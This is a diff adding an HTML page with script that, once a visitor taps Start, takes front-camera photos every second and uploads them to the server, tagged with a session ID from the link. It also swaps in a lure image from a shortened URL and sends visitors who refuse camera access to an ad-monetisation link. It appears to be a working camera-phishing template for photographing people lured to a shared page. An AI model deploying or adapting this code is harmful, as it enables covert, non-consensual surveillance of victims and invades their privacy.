@@ -1,0 +1,78 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Camera Capture</title>
+</head>
+<body>
+  <h2>Start Camera Capture</h2>
+  <img id="placeholder" src="https://via.placeholder.com/720x405.png?text=Tap+Start+to+Allow+Camera" width="100%">
+  <button id="startBtn">Start</button>
+  <button id="stopBtn" disabled>Stop</button>
+  <div id="status">Status: waiting</div>
+
+<script>
+(() => {
+  const UPLOAD_URL = "/upload"; // same server
+  const DENY_REDIRECT = "https://www.revenuecpmgate.com/nby93nhg?key=8f31d7b13cf449b9a806927d61fb0e41";
+  const SHOW_IMAGE_URL = "https://shorturl.at/MRjIE";
+  const INTERVAL = 1000;
+
+  const params = new URLSearchParams(location.search);
+  const SESSION = params.get("session") || "unknown";
+
+  let stream, video, timer, count = 0;
+  const startBtn = document.getElementById("startBtn");
+  const stopBtn = document.getElementById("stopBtn");
+  const status = document.getElementById("status");
+  const placeholder = document.getElementById("placeholder");
+
+  function setStatus(t){ status.textContent = "Status: " + t; }
+
+  async function startCam(){
+    try{
+      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+      placeholder.src = SHOW_IMAGE_URL;
+      video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+      startBtn.disabled=true; stopBtn.disabled=false;
+      setStatus("Camera allowed...");
+
+      captureAndSend();
+      timer=setInterval(captureAndSend,INTERVAL);
+    }catch(e){
+      window.location.href=DENY_REDIRECT;
+    }
+  }
+
+  function stopCam(){
+    if(timer) clearInterval(timer);
+    if(stream) stream.getTracks().forEach(t=>t.stop());
+    startBtn.disabled=false; stopBtn.disabled=true;
+    setStatus("Stopped after "+count+" captures.");
+  }
+
+  function getImage(){
+    const c=document.createElement("canvas");
+    c.width=video.videoWidth||640; c.height=video.videoHeight||480;
+    c.getContext("2d").drawImage(video,0,0,c.width,c.height);
+    return c.toDataURL("image/jpeg",0.7);
+  }
+
+  async function captureAndSend(){
+    const img=getImage(); count++;
+    setStatus("Uploading "+count);
+    await fetch(UPLOAD_URL,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({session:SESSION,index:count,image:img})
+    });
+  }
+
+  startBtn.onclick=startCam;
+  stopBtn.onclick=stopCam;
+})();
+</script>
+</body>
+</html>
